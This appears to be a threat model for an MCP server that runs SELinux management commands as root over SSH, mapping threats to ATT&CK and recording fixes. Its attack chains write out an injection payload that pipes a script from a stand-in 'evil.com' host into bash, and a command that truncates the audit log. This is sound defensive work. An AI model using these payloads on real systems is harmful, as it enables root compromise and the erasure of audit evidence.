# enforcement-mcp Threat Model

**Date:** 2026-10-09
**Methodology:** STRIDE + ATT&CK mapping
**Scope:** enforcement-mcp v0.4.0 (29 tools, SSH-proxy mode)
**Attacker models:** Malicious MCP client, compromised agent, network attacker

## Architecture Overview

```
MCP Client (agent/LLM)
    │
    │  stdio / SSE (identity_token in params)
    │
enforcement-mcp (Python, local)
    │
    │  SSH (Paramiko, key-based auth)
    │
RHEL Target Host (root shell)
    ├── setools, ausearch, semanage, setsebool
    ├── fapolicyd-cli
    ├── /var/lib/enforcement-mcp/audit.jsonl
    └── /var/lib/enforcement-mcp/containments.json
```

Trust boundaries:
1. MCP transport → enforcement-mcp process
2. enforcement-mcp process → SSH → target host root shell
3. enforcement-mcp process → JWKS endpoint (HTTPS)
4. enforcement-mcp process → Red Hat CVE API (HTTPS)

---

## STRIDE Analysis

### S — Spoofing

| ID | Threat | ATT&CK | Severity | Status |
|----|--------|--------|----------|--------|
| S1 | **SPIFFE ID spoofing** — SPIFFE verification is string-only. Any MCP client can claim `spiffe://domain/admin/anything` as `identity_token`. No X.509 chain validation. | T1078.004 (Cloud Accounts) | High | **OPEN** |
| S2 | **Anonymous = Admin** — `anonymous_identity()` returns `Role.ADMIN`. Default config (mode=none, policy=permissive) gives every caller admin access. | T1078 (Valid Accounts) | High | **FIXED** |
| S3 | **SSH MITM** — `AutoAddPolicy()` accepts any host key on first connect. Network attacker intercepts SSH, receives root commands, returns crafted output. | T1557 (Adversary-in-the-Middle) | High | **FIXED** |
| S4 | **JWT algorithm confusion** — `alg` read from unverified JWT header, passed to PyJWT as `algorithms=[alg]`. Attacker could force HS256 with RSA public key. PyJWT 2.x mitigates `alg=none` but HS256 confusion is possible. | T1550.001 (Application Access Token) | Medium | **FIXED** |

### T — Tampering

| ID | Threat | ATT&CK | Severity | Status |
|----|--------|--------|----------|--------|
| T1 | **Command injection via tool parameters** — ~40+ injection points across all tool files. Every tool parameter (`path`, `name`, `source_type`, `target`, `tclass`, `permission`, `process`, `login`, `range_spec`, `categories`, `context_type`, `cil`) now validated by `sanitize.py` and shell-escaped via `shlex.quote()`. | T1059.004 (Unix Shell) | **Critical** | **FIXED** — All 8 tool files sanitized |
| T2 | **CIL heredoc escape** — `load_module` writes CIL via `cat << 'EMCP_EOF'`. If CIL contains `EMCP_EOF` on a line, heredoc terminates early; remaining content executes as shell. | T1059.004 (Unix Shell) | Critical | **FIXED** |
| T3 | **Audit trail tampering** — Audit log written via same root SSH session. Attacker exploiting T1 can truncate/modify audit in same session. | T1070.002 (Clear Linux Logs) | High | **OPEN** |
| T4 | **Audit echo injection** — `_sanitize_params` only redacts specific key names. Other params (e.g., `name` containing `$(cmd)`) flow into `echo '...'` command. | T1059.004 (Unix Shell) | Medium | **FIXED** |
| T5 | **/tmp CIL TOCTOU** — `load_module` writes to predictable `/tmp/{name}.cil`, then `semodule -i`. Local attacker on target can race to replace file. World-readable. | T1574 (Hijack Execution Flow) | Medium | **FIXED** |

### I — Information Disclosure

| ID | Threat | ATT&CK | Severity | Status |
|----|--------|--------|----------|--------|
| I1 | **stderr returned to caller** — Remote host stderr (paths, kernel versions, error details) returned directly in tool responses. | T1082 (System Information Discovery) | Medium | **OPEN** |
| I2 | **Posture data to unauthenticated callers** — `host_posture` returns SELinux mode, custom modules, non-default booleans, fapolicyd config. No identity check on diagnosis tools. Reconnaissance value. | T1082 (System Information Discovery) | Low | By design |
| I3 | **Identity verification errors expose config** — JWKS URI, trust domain in error messages. | T1082 | Low | **OPEN** |

### D — Denial of Service

| ID | Threat | ATT&CK | Severity | Status |
|----|--------|--------|----------|--------|
| D1 | **Unbounded SSH commands** — No rate limiting. Malicious client can flood with expensive commands (sesearch, ausearch). | T1499 (Endpoint DoS) | Low | **OPEN** |
| D2 | **SSH singleton failure** — Single SSH connection; if it drops, all tools fail until restart. | — | Low | **OPEN** |

### E — Elevation of Privilege

| ID | Threat | ATT&CK | Severity | Status |
|----|--------|--------|----------|--------|
| E1 | **Viewer → Admin via command injection** — Diagnosis tools (no identity check) previously accepted unsanitized `path` and `process` params, executed as root. All diagnosis tools now validate inputs via `sanitize.py`. | T1068 (Exploitation for Privilege Escalation) | **Critical** | **FIXED** |
| E2 | **Permissive mode default** — Default `authz_policy=permissive` logs but doesn't enforce. All callers pass authorization regardless of role. | T1548 (Abuse Elevation Control Mechanism) | Medium | **FIXED** |

---

## Critical Attack Chains

### Chain 1: Unauthenticated RCE (pre-fix)

```
1. Attacker connects as MCP client (no identity_token needed)
2. Calls diagnosis.troubleshoot with process="'; curl evil.com/shell.sh|bash; '"
3. Server builds: ausearch -m AVC -ts recent 2>/dev/null | grep ''; curl evil.com/shell.sh|bash; ''
4. Paramiko executes as root on target host
5. Attacker has root shell, no authentication required
```

**Mitigated by:** Input sanitization (T1 fix)

### Chain 2: Identity Bypass + Policy Mutation

```
1. Attacker connects, identity_mode=oauth but authz_policy=permissive (default)
2. Calls manage.set_boolean without identity_token
3. Server: anonymous_identity() → Role.ADMIN → authorized (permissive logs, doesn't block)
4. Attacker toggles security-critical boolean
```

**Mitigated by:** Anonymous role changed to VIEWER (S2 fix), default strict policy recommended

### Chain 3: Audit Evasion

```
1. Attacker exploits T1 for command injection
2. Before tool returns, injected command runs: truncate -s 0 /var/lib/enforcement-mcp/audit.jsonl
3. Audit entry for the tool call is written to the now-empty file
4. No evidence of prior activity remains
```

**Status:** OPEN — requires architectural change (separate audit channel)

---

## Fixes Applied

### Input Sanitization (`src/enforcement_mcp/sanitize.py`)

New module with validators for each parameter type:

- `sanitize_path(path)` — Absolute path, no shell metacharacters
- `sanitize_identifier(name)` — SELinux type/boolean/module names: `^[a-zA-Z_][a-zA-Z0-9_.-]*$`
- `sanitize_cil(cil)` — No heredoc terminators, no shell metacharacters outside CIL syntax
- `sanitize_selinux_type(type_name)` — SELinux type identifier pattern
- `sanitize_mls_range(range_spec)` — MLS range format: `s[0-9]+(-s[0-9]+)?(:[cC][0-9.,]+)?`
- `sanitize_mls_categories(categories)` — Each matches `c[0-9]+`
- `sanitize_process_name(process)` — Alphanumeric + hyphens/underscores/dots
- `quote_arg(arg)` — `shlex.quote()` wrapper for anything flowing into commands

All tool functions call sanitizers before building commands. Invalid input returns
structured error response instead of executing.

### SSH Host Key Verification

- Replaced `AutoAddPolicy` with `WarningPolicy` (log + continue) as default
- Added `ENFORCEMENT_MCP_SSH_HOST_KEY_POLICY` env var: `warn` (default), `reject`, `auto`
- `reject` mode uses `~/.ssh/known_hosts` only

### Anonymous Identity → Viewer

- `anonymous_identity()` now returns `Role.VIEWER` instead of `Role.ADMIN`
- Anonymous callers can use diagnosis tools only (by design)
- Management tools require verified identity in strict mode

### JWT Algorithm Allowlist

- Replaced `algorithms=[alg]` with hardcoded allowlist: `["RS256", "RS384", "RS512", "ES256", "ES384", "ES512"]`
- Ignores attacker-supplied `alg` header

### Secure CIL File Writes

- Uses `mktemp -d` for CIL files instead of predictable `/tmp/{name}.cil`
- Directory permissions 0700
- Cleanup on success or failure

---

## Remaining Open Items

| ID | Threat | Mitigation Path | Priority |
|----|--------|-----------------|----------|
| T3 | Audit trail tampering | Separate audit channel (syslog, or second SSH connection with append-only user) | Medium |
| S1 | SPIFFE ID spoofing | Require X.509 SVID from Workload API. Current string-based check only useful with mTLS transport. | Medium |
| I1 | stderr disclosure | Sanitize stderr before returning — strip paths, limit length | Low |
| I3 | Config in error messages | Generic error messages for identity failures | Low |
| D1 | No rate limiting | Token bucket per caller identity | Low |
| D2 | SSH reconnection | Auto-reconnect with backoff | Low |

---

## Attacker Model Notes

**MCP transport trust:** MCP stdio transport provides no caller authentication.
Any process that can connect to the MCP server can call any tool. Identity
verification via `identity_token` is application-layer — the transport itself
is unauthenticated. This is why input sanitization is the most critical control:
the MCP client is an untrusted input source.

**SSH as blast radius amplifier:** enforcement-mcp connects as root. Every
command injection is a root command injection. Consider least-privilege SSH:
a dedicated `enforcement-mcp` user with sudo rules for specific commands only.

**Defense in depth layers:**
1. Input sanitization (prevents injection) ← **implemented**
2. Identity verification (prevents unauthorized access) ← **implemented**
3. RBAC (limits scope of authorized access) ← **implemented**
4. Risk scoring + critical block (prevents high-impact changes) ← **implemented**
5. dry_run default (prevents accidental mutations) ← **implemented**
6. Audit trail (detects unauthorized activity) ← **partially implemented**
7. SSH least-privilege (limits blast radius) ← **not yet implemented**
